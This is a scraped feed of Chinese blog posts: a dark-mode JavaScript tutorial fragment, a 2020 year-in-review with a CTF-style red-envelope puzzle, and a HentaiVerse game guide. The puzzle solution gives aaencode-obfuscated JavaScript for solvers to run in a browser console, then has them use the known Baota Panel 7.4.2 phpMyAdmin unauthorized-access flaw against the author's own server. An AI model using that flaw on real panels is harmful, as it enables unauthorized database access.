当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 